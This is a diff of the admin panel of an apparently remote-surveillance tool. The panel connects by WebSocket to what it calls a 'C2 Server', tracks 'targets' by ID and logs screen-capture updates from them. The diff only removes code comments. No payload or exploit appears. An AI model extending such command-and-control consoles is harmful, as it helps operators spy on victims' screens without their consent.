@@ -44,7 +44,6 @@
 
         ws.onopen = () => {
             console.log("Admin connected to C2");
-            // Register as admin immediately
             ws.send(JSON.stringify({ type: 'register_admin' }));
             addLog("Connected to C2 Server", "blue");
         };
@@ -58,7 +57,6 @@
                     addLog("Admin Session Registered", "blue");
                 }
                 else if (data.type === 'alert') {
-                    // Standard alert messages (New User, Disconnect)
                     addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
                 }
                 else if (data.type === 'info') {
@@ -69,7 +67,6 @@
                     if (!users[data.targetId]) {
                         users[data.targetId] = { status: 'Online', logs: [], info: data, lastSeen: Date.now() };
                     } else {
-                        // Update existing user info
                         users[data.targetId].status = 'Online';
                         users[data.targetId].info = data;
                         users[data.targetId].lastSeen = Date.now();
@@ -80,10 +77,8 @@
                     addLog(data.message, 'blue');
                 }
                 else if (data.type === 'screen_data') {
-                    // Log screen updates
                     addLog(`📺 Screen update from ${data.targetId}`, 'blue');
                     
-                    // Ensure user exists in grid even if they didn't send 'info' first
                     if (!users[data.targetId]) {
                         users[data.targetId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                     }
@@ -95,7 +90,6 @@
                     if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data') {
                         addLog(`[${data.targetId}] Received: ${data.type}`, 'blue');
 
-                        // Ensure user exists in grid
                         if (!users[data.targetId]) {
                             users[data.targetId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                         }
@@ -126,7 +120,6 @@
 
             logContainer.prepend(div);
 
-            // Keep log size manageable
             if (logContainer.children.length > 100) {
                 logContainer.removeChild(logContainer.lastChild);
             }
@@ -154,7 +147,6 @@
         }
 
         function joinUser(id) {
-            // Placeholder for actual WebRTC join logic
             alert(`Connecting to ${id}...`);
         }
     </script>
